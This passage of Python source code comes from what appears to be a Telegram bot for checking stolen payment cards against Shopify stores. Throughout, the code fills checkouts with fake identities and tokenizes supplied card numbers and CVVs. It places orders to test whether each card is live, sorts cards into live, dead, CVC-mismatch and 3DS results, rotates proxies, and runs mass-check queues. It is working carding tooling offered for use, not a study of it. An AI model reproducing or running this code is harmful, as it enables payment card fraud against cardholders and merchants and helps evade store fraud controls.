            checkout_url = site_url + '/checkout/'
            async with session.post(url=checkout_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
                checkout_response_url = str(response.url)
                if 'login' in checkout_response_url.lower():
                    return False, "Login required", None

                text = await response.text()
                # Extract session token
                sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;') or \
                      extract_between(text, 'name="serialized-sessionToken" content="', '"') or \
                      extract_between(text, '"serializedSessionToken":"', '"') or \
                      extract_between(text, 'data-session-token="', '"') or \
                      extract_between(text, '"sessionToken":"', '"')
            
            if sst:
                return True, "Working", info
            else:
                return False, "No session token", None
                
    except Exception as e:
        return False, str(e), None

async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
    """Process a single card with given site and proxy"""
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    receipt_id = None
    order_url = None
    
    ourl = normalize_site_url(site_url)
    displayName = ""
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"
    max_retries = 1  # Retry once with new proxy if connection fails

    for attempt in range(max_retries + 1):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': ourl,
                'Referer': ourl
            }

            address_info = pick_addr(ourl)
            country_code = address_info["countryCode"]
            
            firstName, lastName = Utils.get_random_name()
            email = Utils.generate_email(firstName, lastName)
            
            phone = address_info["phone"]
            street = address_info["address1"]
            city = address_info["city"]
            state = address_info["zoneCode"]
            s_zip = address_info["postalCode"]
            address2 = ""

            # Get variant_id from site
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                # Remove dead site from user's sites
                await remove_dead_site(user_id, site_url)
                return False, "SITE_DEAD", gateway, total_price, currency, receipt_id, order_url
            variant_id = info['variant_id']

            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                url = ourl
                cart = url + '/cart/add.js'
                checkout = url + '/checkout/'

                cart_headers = {
                    **headers,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json, text/javascript'
                }
                async with session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
                    cart_status = cart_resp.status

                if cart_status != 200:
                    cart_headers_alt = {
                        **headers,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    }
                    cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                    async with session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy) as cart_resp:
                        cart_status = cart_resp.status
                
                if cart_status != 200:
                    return False, f"Cart failed with status {cart_status}", gateway, total_price, currency, receipt_id, order_url

                checkout_headers = {
                    **headers,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
                async with session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy) as response:
                    checkout_url = str(response.url)
                    attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
                    attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

                    sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
                    text = await response.text()
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                    if not sst:
                        sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                    if not sst:
                        sst = extract_between(text, '"serializedSessionToken":"', '"')
                    if not sst:
                        sst = extract_between(text, 'data-session-token="', '"')
                    if not sst:
                        sst = extract_between(text, '"sessionToken":"', '"')
                
                if 'login' in checkout_url.lower():
                    await remove_dead_site(user_id, site_url)
                    return False, "LOGIN_REQUIRED", gateway, total_price, currency, receipt_id, order_url

                queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
                stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
                
                merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                        extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                        extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
                if not merch:
                    merch = str(variant_id)
                
                currency = 'USD'
                if 'currencyCode&quot;:&quot;' in text:
                    currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
                elif '"currencyCode":"' in text:
                    currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
                
                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                         extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
                if not subtotal:
                    price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                    subtotal = price_match.group(1) if price_match else "0.01"

                if not sst:
                    return False, "Failed to get session token", gateway, total_price, currency, receipt_id, order_url

                params = {'operationName': 'Proposal'}
                
                json_data = {
                    'query': QUERY_PROPOSAL_SHIPPING,
                    'variables': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken or '',
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': country_code, 'postalCode': s_zip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': state, 'phone': phone
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True}
                                    },
                                    'options': {}
                                },
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True
                        },
                        'deliveryExpectations': {'deliveryExpectationLines': []},
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stableId or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None
                                    }
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                                'lineComponentsSource': None,
                                'lineComponents': []
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': '', 'city': '', 'countryCode': country_code,
                                    'lastName': '', 'zoneCode': 'ENG', 'phone': ''
                                }
                            }
                        },
                        'buyerIdentity': {
                            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                            'email': email,
                            'emailChanged': False,
                            'phoneCountryCode': country_code,
                            'marketingConsent': [{'email': {'value': email}}],
                            'shopPayOptInPhone': {'countryCode': country_code},
                            'rememberMe': False
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': []
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None,
                            'signatureUuid': None,
                            'lineItemScriptChanges': [],
                            'paymentScriptChanges': [],
                            'shippingScriptChanges': []
                        },
                        'optionalDuties': {'buyerRefusesDuties': False}
                    },
                    'operationName': 'Proposal'
                }

                graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
                
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                )
                
                if not response:
                    # Connection failed, try new proxy if available
                    if attempt < max_retries:
                        # Get new proxy for retry
                        user_proxies = await get_user_proxies(user_id)
                        if user_proxies:
                            # Try a different proxy
                            available_proxies = [p for p in user_proxies if p != proxy_str]
                            if available_proxies:
                                proxy_str = random.choice(available_proxies)
                                proxy = parse_proxy(proxy_str)
                                retry_reason = sanitize_for_log(normalize_response_text(resp_text))[:180]
                                logger.info(f"Retrying with new proxy for user {user_id} (reason: {retry_reason})")
                                continue
                    return False, f"Request failed: {resp_text}", gateway, total_price, currency, receipt_id, order_url
                
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                
                try:
                    resp_json = json.loads(resp_text)
                except json.JSONDecodeError as e:
                    return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency, receipt_id, order_url

                if 'errors' in resp_json:
                    errors = resp_json.get('errors', [])
                    error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                    return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency, receipt_id, order_url

                try:
                    if 'data' not in resp_json:
                        return False, "No data in proposal response", gateway, total_price, currency, receipt_id, order_url
                    
                    session_data = resp_json['data'].get('session')
                    if session_data is None:
                        return False, "Session is null", gateway, total_price, currency, receipt_id, order_url
                    
                    negotiate = session_data.get('negotiate')
                    if negotiate is None:
                        return False, "Negotiate returned null", gateway, total_price, currency, receipt_id, order_url
                    
                    result = negotiate.get('result')
                    if result is None:
                        return False, "Result is null", gateway, total_price, currency, receipt_id, order_url
                    
                    result_type = result.get('__typename', 'Unknown')
                    
                    if result_type == 'CheckpointDenied':
                        return False, f"Checkpoint Denied", gateway, total_price, currency, receipt_id, order_url
                    
                    if result_type == 'Throttled':
                        return False, "Throttled", gateway, total_price, currency, receipt_id, order_url
                    
                    if result_type == 'NegotiationResultFailed':
                        return False, "Negotiation failed", gateway, total_price, currency, receipt_id, order_url
                    
                    checkpoint_data = result.get('checkpointData')
                    
                    seller_proposal = result.get('sellerProposal')
                    if seller_proposal is None:
                        return False, "Seller proposal is null", gateway, total_price, currency, receipt_id, order_url
                    
                    delivery_data = seller_proposal.get('delivery')
                    running_total_data = seller_proposal.get('runningTotal')
                    
                    if not running_total_data:
                        return False, "No runningTotal in sellerProposal", gateway, total_price, currency, receipt_id, order_url
                    
                    running_total = running_total_data['value']['amount']
                    
                except (KeyError, TypeError) as e:
                    return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency, receipt_id, order_url

                if not delivery_data:
                    return False, "No delivery data in proposal", gateway, total_price, currency, receipt_id, order_url
                
                delivery_type = delivery_data.get('__typename', '')
                
                if delivery_type == 'PendingTerms':
                    delivery_strategy = ''
                    shipping_amount = 0.0
                elif delivery_type == 'FilledDeliveryTerms':
                    delivery_lines = delivery_data.get('deliveryLines', [{}])
                    if delivery_lines and len(delivery_lines) > 0:
                        available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                        if available_strategies and len(available_strategies) > 0:
                            delivery_strategy = available_strategies[0].get('handle', '')
                            shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                            try:
                                shipping_amount = float(shipping_amount_data)
                            except:
                                shipping_amount = 0.0
                        else:
                            delivery_strategy = ''
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
                
                try:
                    tax_data = seller_proposal.get('tax', {})
                    if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                        tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                        tax_amount = float(tax_amount_data)
                    else:
                        tax_amount = 0.0
                except:
                    tax_amount = 0.0

                payment_data = seller_proposal.get('payment', {})
                if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                    payment_methods = payment_data.get('availablePaymentLines', [])
                    for method in payment_methods:
                        payment_method = method.get('paymentMethod', {})
                        if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                            payment_identifier = payment_method.get('paymentMethodIdentifier')
                            displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                            
                            gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                            total_price = str(float(running_total) + shipping_amount + tax_amount)
                            
                            break
                
                if not payment_identifier:
                    return False, "No valid payment method found", gateway, total_price, currency, receipt_id, order_url
                
                json_data['query'] = QUERY_PROPOSAL_DELIVERY
                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy if delivery_strategy else '',
                        'customDeliveryRate': False
                    },
                    'options': {}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                    'lines': [{'stableId': stableId or '1'}]
                }
                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                json_data['variables']['payment']['billingAddress'] = {
                    'streetAddress': {
                        'address1': street, 'address2': address2, 'city': city,
                        'countryCode': country_code, 'postalCode': s_zip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': state, 'phone': phone
                    }
                }
                json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
                json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                )
                
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency, receipt_id, order_url

                formattedCard = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
                payload = {
                    "credit_card": {
                        "month": mes,
                        "name": f"{firstName} {lastName}",
                        "number": formattedCard,
                        "verification_value": cvv,
                        "year": ano,
                        "start_month": "",
                        "start_year": "",
                        "issue_number": ""
                    },
                    "payment_session_scope": f"www.{urlparse(url).netloc}"
                }
                
                async with session.post('https://deposit.shopifycs.com/sessions', json=payload, proxy=proxy) as response:
                    try:
                        token_data = await response.json(content_type=None)
                        token = token_data.get('id')
                        if not token:
                            return False, 'Unable to get payment token', gateway, total_price, currency, receipt_id, order_url
                    except Exception as e:
                        return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency, receipt_id, order_url

                params = {'operationName': 'SubmitForCompletion'}
                
                submit_variables = {
                    'input': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken or '',
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'streetAddress': {
                                        'address1': street, 'address2': address2, 'city': city,
                                        'countryCode': country_code, 'postalCode': s_zip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': state, 'phone': phone
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': delivery_strategy if delivery_strategy else '',
                                        'customDeliveryRate': False
                                    },
                                    'options': {'phone': phone}
                                },
                                'targetMerchandiseLines': {
                                    'lines': [{'stableId': stableId or '1'}]
                                },
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {
                                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                                },
                                'destinationChanged': False
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': True,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True
                        },
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stableId or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None
                                    }
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {
                                    'value': {'amount': subtotal, 'currencyCode': currency}
                                },
                                'lineComponentsSource': None,
                                'lineComponents': []
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': payment_identifier,
                                        'sessionId': token,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': street, 'address2': address2,
                                                'city': city, 'countryCode': country_code,
                                                'postalCode': s_zip, 'firstName': firstName,
                                                'lastName': lastName, 'zoneCode': state,
                                                'phone': phone
                                            }
                                        },
                                        'cardSource': None
                                    }
                                },
                                'amount': {
                                    'value': {'amount': running_total, 'currencyCode': currency}
                                },
                                'dueAt': None
                            }],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': street, 'address2': address2,
                                    'city': city, 'countryCode': country_code,
                                    'postalCode': s_zip, 'firstName': firstName,
                                    'lastName': lastName, 'zoneCode': state,
                                    'phone': phone
                                }
                            }
                        },
                        'buyerIdentity': {
                            'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                            'email': email,
                            'emailChanged': False,
                            'phoneCountryCode': country_code,
                            'marketingConsent': [{'email': {'value': email}}],
                            'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                            'rememberMe': False
                        },
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {
                                'value': {'amount': str(tax_amount), 'currencyCode': currency}
                            },
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': []
                        },
                        'tip': {'tipLines': []},
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []},
                        'nonNegotiableTerms': None,
                        'optionalDuties': {'buyerRefusesDuties': False}
                    },
                    'attemptToken': attempt_token,
                    'metafields': [],
                    'analytics': {'requestUrl': checkout_url}
                }
                
                if checkpoint_data:
                    submit_variables['input']['checkpointData'] = checkpoint_data
                
                submit_json_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': submit_variables,
                    'operationName': 'SubmitForCompletion'
                }

                response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
                )
                
                if is_captcha_required(text):
                    return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency, receipt_id, order_url
                
                if "Your order total has changed." in text:
                    return False, "Site not supported", gateway, total_price, currency, receipt_id, order_url
                if "The requested payment method is not available." in text:
                    return False, "Payment method not available", gateway, total_price, currency, receipt_id, order_url
                
                try:
                    resp_json = json.loads(text)
                    submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                    
                    if not submit_data:
                        errors = resp_json.get('errors', [])
                        if errors:
                            for error in errors:
                                code = error.get('code')
                                if code:
                                    return False, code, gateway, total_price, currency, receipt_id, order_url
                        return False, "Empty submit response", gateway, total_price, currency, receipt_id, order_url
                    
                    result_type = submit_data.get('__typename', '')
                    
                    if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                        receipt = submit_data.get('receipt', {})
                        if receipt:
                            receipt_type = receipt.get('__typename', '')
                            
                            if receipt_type == 'ProcessedReceipt':
                                receipt_id = receipt.get('id')
                                order_url = receipt.get('orderStatusPageUrl')
                                return True, "ORDER_PLACED", gateway, total_price, currency, receipt_id, order_url
                            
                            rid = receipt.get('id')
                        else:
                            return False, "SubmitSuccess but no receipt", gateway, total_price, currency, receipt_id, order_url
                    
                    elif result_type == 'SubmitFailed':
                        reason = submit_data.get('reason', 'Unknown reason')
                        return False, extract_clean_response(reason), gateway, total_price, currency, receipt_id, order_url
                    
                    elif result_type == 'SubmitRejected':
                        errors = submit_data.get('errors', [])
                        if errors:
                            for error in errors:
                                code = error.get('code')
                                if code:
                                    return False, code, gateway, total_price, currency, receipt_id, order_url
                        return False, "Submit Rejected", gateway, total_price, currency, receipt_id, order_url
                    
                    elif result_type == 'Throttled':
                        return False, "Throttled", gateway, total_price, currency, receipt_id, order_url
                    
                    receipt = submit_data.get('receipt', {})
                    if not receipt:
                        return False, "No receipt in submit response", gateway, total_price, currency, receipt_id, order_url
                    
                    rid = receipt.get('id')
                    if not rid:
                        return False, "No receipt ID", gateway, total_price, currency, receipt_id, order_url
                    
                except json.JSONDecodeError:
                    return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency, receipt_id, order_url
                except Exception as e:
                    return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency, receipt_id, order_url

                params = {'operationName': 'PollForReceipt'}
                poll_json_data = {
                    'query': QUERY_POLL,
                    'variables': {'receiptId': rid, 'sessionToken': sst},
                    'operationName': 'PollForReceipt'
                }

                await asyncio.sleep(1.5)
                
                receipt_resp_json = None
                final_text = ""
                for i in range(4):
                    response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, params, headers, poll_json_data,
                        checkout_url, max_retries=1
                    )
                    
                    if is_captcha_required(final_text):
                        return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                    
                    try:
                        receipt_resp_json = json.loads(final_text)
                        receipt_data = receipt_resp_json.get('data', {}).get('receipt', {})

                        if receipt_data:
                            typename = receipt_data.get('__typename', '')
                            if typename == 'ProcessedReceipt' or any(k in final_text for k in success_keys):
                                receipt_id = receipt_data.get('id')
                                order_url = receipt_data.get('orderStatusPageUrl')
                                return True, "ORDER_PLACED", gateway, total_price, currency, receipt_id, order_url
                            elif typename == 'ActionRequiredReceipt' or any(k in final_text for k in twofactor_keys):
                                return True, "OTP_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                            
                            elif typename == 'INCORRECT_CVC' or any(k in final_text for k in ccn_keys):
                                return True, "INCORRECT_CVC", gateway, total_price, currency, receipt_id, order_url
                            
                            elif typename == 'INSUFFICIENT_FUNDS':
                                return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency, receipt_id, order_url
                                
                            elif typename == 'FailedReceipt' or any(k in final_text for k in fail_keys):
                                error = receipt_data.get('processingError', {})
                                code = error.get('code', 'UNKNOWN_ERROR')
                                return True, code, gateway, total_price, currency, receipt_id, order_url

                            if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                                await asyncio.sleep(2)
                                continue
                            
                    except Exception as e:
                        pass
                    
                    if 'WaitingReceipt' in final_text:
                        await asyncio.sleep(2)
                    else:
                        break
                
                if 'CAPTCHA_REQUIRED' in final_text:
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                
                if 'WaitingReceipt' in final_text:
                    return False, "Change Proxy or Site", gateway, total_price, currency, receipt_id, order_url
                
                                

        except Exception as e:
            if attempt < max_retries:
                # Try with new proxy if available
                user_proxies = await get_user_proxies(user_id)
                if user_proxies:
                    available_proxies = [p for p in user_proxies if p != proxy_str]
                    if available_proxies:
                        proxy_str = random.choice(available_proxies)
                        proxy = parse_proxy(proxy_str)
                        retry_reason = sanitize_for_log(normalize_response_text(f"{type(e).__name__}: {e}"))[:180]
                        logger.info(f"Retrying after exception with new proxy for user {user_id} (reason: {retry_reason})")
                        continue
            return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency, receipt_id, order_url
        
        # If we got here without issues, break the retry loop
        break

    return False, "Max retries exceeded", gateway, total_price, currency, receipt_id, order_url

async def remove_dead_site(user_id, site_url):
    """Remove dead site from user's sites"""
    try:
        site_url = normalize_site_url(site_url)
        if DB_AVAILABLE:
            try:
                await user_sites_col.update_one(
                    {'user_id': user_id},
                    {'$pull': {'sites': {'url': site_url}}}
                )
            except Exception as db_error:
                set_db_unavailable(db_error)
        if user_id in mem_user_sites:
            mem_user_sites[user_id] = [
                s for s in mem_user_sites[user_id]
                if not (isinstance(s, dict) and s.get('url') == site_url)
            ]
            if not mem_user_sites[user_id]:
                mem_user_sites.pop(user_id, None)
    except Exception as e:
        logger.error(f"Error removing dead site: {e}")

async def save_working_site(user_id, site_url, product_info):
    """Save working site with product info to user's sites"""
    try:
        site_url = normalize_site_url(site_url)
        try:
            product_price = float(str(product_info.get('price', '0')).replace(',', '').strip())
        except Exception:
            return False, "Invalid product price"

        if product_price < MIN_SITE_PRODUCT_PRICE:
            return False, f"Cheapest product ${product_price:.2f} is below ${MIN_SITE_PRODUCT_PRICE:.2f}"

        if product_price > MAX_SITE_PRODUCT_PRICE:
            return False, f"Cheapest product ${product_price:.2f} is above ${MAX_SITE_PRODUCT_PRICE:.2f}"

        # Check if user already has max sites
        user_sites_doc = None
        if DB_AVAILABLE:
            try:
                user_sites_doc = await user_sites_col.find_one({'user_id': user_id})
            except Exception as db_error:
                set_db_unavailable(db_error)
                user_sites_doc = get_memory_site_doc(user_id)
        else:
            user_sites_doc = get_memory_site_doc(user_id)

        current_count = len(user_sites_doc.get('sites', [])) if user_sites_doc else 0
        
        if current_count >= MAX_SITES_PER_USER:
            return False, f"Maximum site limit reached ({MAX_SITES_PER_USER})"
        
        # Check if site already exists for user
        if user_sites_doc:
            existing_sites = [s.get('url') if isinstance(s, dict) else s for s in user_sites_doc.get('sites', [])]
            if site_url in existing_sites:
                return True, "Site already exists"
        
        # Add site
        site_entry = {
            'url': site_url,
            'price': f"{product_price:.2f}",
            'variant_id': product_info.get('variant_id'),
            'product_link': product_info.get('link'),
            'last_checked': utcnow()
        }

        if DB_AVAILABLE:
            try:
                await user_sites_col.update_one(
                    {'user_id': user_id},
                    {
                        '$addToSet': {
                            'sites': site_entry
                        }
                    },
                    upsert=True
                )
            except Exception as db_error:
                set_db_unavailable(db_error)

        # Always mirror in memory so fallback remains consistent.
        user_sites = mem_user_sites[user_id]
        if site_url not in [(s.get('url') if isinstance(s, dict) else str(s)) for s in user_sites]:
            user_sites.append(site_entry)
        return True, "Site added successfully"
    except Exception as e:
        logger.error(f"Error saving working site: {e}")
        return False, str(e)

async def update_task_progress(message_id, stats, start_time=None):
    """Update task progress message."""
    try:
        if message_id not in task_messages:
            return
        
        message = task_messages[message_id]
        
        if start_time is None:
            start_time = task_stats[message_id].get('start_time', datetime.now())
        
        elapsed = datetime.now() - start_time
        elapsed_str = str(elapsed).split('.')[0]  # Remove microseconds
        
        # Get user info (cached)
        user_id = task_users.get(message_id)
        user_name = await get_cached_user_display_name(user_id) if user_id else 'User'
        
        duration_seconds = round(elapsed.total_seconds(), 1)
        task_type = stats.get('task_type', 'mchk')
        total_cards = stats.get('total', 0)
        processed = stats.get('checked', 0)

        if task_type == 'chksite':
            working_sites = stats.get('hit', 0)
            not_working_sites = stats.get('failed', 0)
            progress_text = f"""🌐 <b>SITE CHECKER</b>
━━━━━━━━━━━━━━
📂 Total Sites: {total_cards}
📤 Processed: {processed}
━━━━━━━━━━━━━━
🎯 <b>RESULTS BREAKDOWN</b>
• ✅ Working Sites: {working_sites}
• ❌ Not Working Sites: {not_working_sites}
━━━━━━━━━━━━━━
⏱️ Duration: {duration_seconds}s
👤 {user_name}"""
            keyboard = None
        else:
            otp = stats.get('otp', 0)
            captcha = stats.get('captcha', 0)
            live = stats.get('live', 0)
            failed = stats.get('failed', 0)
            dead = failed
            hits = stats.get('hit', 0)
            progress_text = f"""💳 <b>CARD PROCESSOR</b>
━━━━━━━━━━━━━━
📂 Total Cards: {total_cards}
📤 Processed: {processed}
━━━━━━━━━━━━━━
🎯 <b>RESULTS BREAKDOWN</b>
• ✅ Live: {live}
• ❌ Dead: {dead}
• 💎 Hits: {hits}
• 🔐 3DS: {otp}
• 🧩 Captcha: {captcha}
• 🚫 Failed: {failed}
━━━━━━━━━━━━━━
⏱️ Duration: {duration_seconds}s
👤 {user_name}"""

            keyboard = None
            batch_id = stats.get('batch_id')
            if batch_id and processed < total_cards:
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("⏹️ Stop", callback_data=f"stopmchk_batch:{batch_id}")
                ]])
        
        try:
            await message.edit_text(
                text=progress_text,
                reply_markup=keyboard,
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            # Handle "Message not modified" error silently
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                logger.error(f"Error updating progress: {e}")
                
    except Exception as e:
        logger.error(f"Error in update_task_progress: {e}")

# Task queue worker
async def task_worker(worker_id):
    """Worker to process tasks from queue"""
    logger.info(f"Worker {worker_id} started")
    while True:
        user_id = None
        processing_registered = False
        try:
            task = await TASK_QUEUE.get()
            if task is None:
                TASK_QUEUE.task_done()
                break
            
            user_id = task.get('user_id')
            if user_id is None:
                raise ValueError("Task missing user_id")
            cc_data = task['cc_data']
            site = task['site']
            proxy = task.get('proxy')
            message = task['message']
            task_type = task['type']
            task_id = task.get('task_id')
            batch_id = task.get('batch_id')

            if task_type == 'mchk' and batch_id in cancelled_mchk_batches:
                decrement_queued_tasks(user_id, 1)
                TASK_QUEUE.task_done()
                continue

            mark_task_processing(user_id)
            processing_registered = True
            
            # Process the card
            start_time = time.time()
            success, response, gateway, price, currency, receipt_id, order_url = await process_card(
                cc_data['cc'], cc_data['mes'], cc_data['ano'], cc_data['cvv'],
                site, user_id, proxy
            )

            # Extra mass-check retries when final response is missing/unfinished.
            if task_type == 'mchk' and should_retry_mchk_last_response(success, response):
                user_proxies = await get_user_proxies(user_id)
                tried_proxies = set()
                if proxy:
                    tried_proxies.add(proxy)

                for retry_idx in range(MCHK_LAST_RESPONSE_RETRIES):
